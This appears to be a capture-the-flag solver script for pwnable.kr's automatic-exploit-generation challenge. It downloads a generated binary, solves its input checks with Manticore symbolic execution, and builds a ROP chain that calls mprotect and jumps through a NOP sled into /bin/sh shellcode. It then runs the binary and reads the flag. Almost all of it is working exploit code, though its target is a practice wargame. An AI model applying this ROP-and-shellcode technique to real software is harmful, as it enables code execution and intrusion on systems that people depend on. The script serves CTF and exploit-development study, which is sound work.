#!/usr/bin/env python
# solve aeg on pwnable.kr with manticore
# its not fast enough but ima try to change that
# original angr solution runs in ~9 secs

# this solution works more often however
# sometimes the "stack" runs out of space

from manticore import Manticore
from subprocess import check_output
import sys
import re
import time

from pwn import *
context.arch='amd64'

path = "./aeg_program3"

def symbolic_execution(targets):
    log.info("Starting symbolic execution (this will take a while)")

    m = Manticore(path)
    m.verbosity(0)

    buf_addr = targets["buf_addr"]

    # reached the goal (memcpy call)
    def reached_goal(state):
        #print("Reached goal state.")
        con_buf = state.solve_buffer(buf_addr, 48)
        #print("BUF: %s" % con_buf)
        m.context["magic_values"] = con_buf
        state.abandon()

    m.add_hook(targets["goal"], reached_goal)

    #skip intro shit
    def skip_intro(state):
        buf = state.new_symbolic_buffer(48) # buffer we will solve
        state.cpu.write_bytes(buf_addr, buf)
        state.cpu.RIP = targets["check_start"]

    m.add_hook(targets["cmp_start"], skip_intro)

    def leave_state(state):
        state.abandon()

    for leave_addr in targets["leaves"]:
        m.add_hook(leave_addr, leave_state)

    m.run(procs=24)

    magic_values = m.context["magic_values"]

    return magic_values

def generate_exploit(magic, addr, last_mov, xors):
    log.info('Crafting final exploit')

    b = ELF(path)

    r = ROP(b)
    shellcode = asm(shellcraft.amd64.sh())
    
    ret = r.find_gadget(["ret"])
    pop_rdi = r.find_gadget(["pop rdi", "ret"])
    pop_rbp = r.find_gadget(["pop rbp", "ret"])
    pop_rsi = r.find_gadget(["pop rsi", "pop r15", "ret"])
    
    page_size = 2**12
    mask = page_size - 1
    
    #exploit calls mprotect to make the input executable and then jumps into the shellcode
    exp_str = (
        p64(ret.address)*90 +
        p64(pop_rbp.address) +
        p64(addr+48+48+91*8+4) +
        p64(ret.address)*4 +
        p64(last_mov) + 
        p32(0x7) + p64((addr & ~mask) + 0xc00) + 
        p64(pop_rdi.address) + 
        p64(addr & ~mask) + 
        p64(pop_rsi.address) + 
        p64(0x1000) + 
        b"JUNKJUNK" + 
        p64(b.symbols[b"mprotect"]) + 
        p64(addr+48+48+97*8+32) + 
        b"\x90"*64 + # nop sled
        shellcode
    )
    
    #print input.values() + magic
    exploit = format_input(magic + list(exp_str), xors)
    return exploit

def download_program():
    f = remote("pwnable.kr", 9005)

    line = b"" 
    while b"wait..." not in line:
        line = f.readline()

    b64program = f.readline()
    program = base64.b64decode(b64program.strip())

    progfile = open("aeg_program3.z", "wb+")
    progfile.write(program)
    progfile.close()

    subprocess.call(["uncompress", "--force", "aeg_program3.z"])
    subprocess.call(["chmod", "766", "aeg_program3"])

    log.info("Program decompressed and executable")

    f.close()

# parse objdump to get necessary info
# not sexy but its overkill to do anything else
# nevermind i need some beter static analysis
def parse_disassembly():

    disasm = check_output(["objdump", "-d", "-M", "intel", "-j", ".text", path]).decode()

    xors = re.findall("([0-9a-f]+):.*?\s+xor\s+eax,(0x[0-9a-f]+)", disasm)
    leaves = re.findall("([0-9a-f]+):\s+[0-9a-f ]{8}\s+leave", disasm)
    goal = int(re.findall("([0-9a-f]+):.*?<memcpy@plt>", disasm)[0], 16)
    cmp_start = int(re.findall("([0-9a-f]+):.*?cmp\s+DWORD PTR \[rbp-0x24\],0x2", disasm)[0], 16)
    check_start = re.findall("([0-9a-f]+):.*?movzx\s+eax,BYTE.*?# ([0-9a-f]+)", disasm)[-1]
    all_mov = re.findall("([0-9a-f]+):\s+[0-9a-f ]+\s+movzx\s+edx,BYTE PTR \[rbp-0x4\](.*?jne)", disasm, re.DOTALL)
    # ^ this is a bit fucked up, this is why i used the angr static analysis before

    last_mov = all_mov[-1][0]
    for mov in all_mov:
        if "edx," not in mov[1]:
            last_mov = mov[0] # yeaaaah 
            break

    targets = {}

    targets["cmp_start"] = cmp_start # cmp in main to skip to checking
    targets["check_start"] = int(check_start[0], 16)-20 # where the checking starts
    targets["print"] = cmp_start+11 # puts in main
    targets["buf_addr"] = int(check_start[1], 16) # where the buffer starts
    targets["goal"] =  goal
    targets["xors"] = [int(x[1], 16) for x in xors]
    targets["leaves"] = [int(x, 16)-1 for x in leaves] # -1 to go to the nop
    targets["last_mov"] = int(last_mov, 16)

    return targets

def format_input(input, xors):
    res = ''
    
    count = 0
    for i in input:
        res += "%02x" % (i ^ (xors[count % 2] & 0xff)) 
        count += 1
        
    return res

if __name__ == "__main__":
    download_program()
    targets = parse_disassembly()

    print()
    log.info("BUFFER ADDR: 0x%016x" % targets["buf_addr"])
    print()

    magic = symbolic_execution(targets)
    log.info("MAGIC: %s" % magic)
    exploit = generate_exploit(magic, targets["buf_addr"], targets["last_mov"], targets["xors"])

    print()
    log.info("EXPLOIT: %s" % exploit)
    print()

    #gdb.debug([path, exploit], "b * 0x%016x\n" % (targets["goal"]+6))
    #input()

    x = process([path, exploit])
    x.read()
    time.sleep(0.5)
    x.writeline("cat flag")
    log.info("FLAG: %s" % x.read().decode())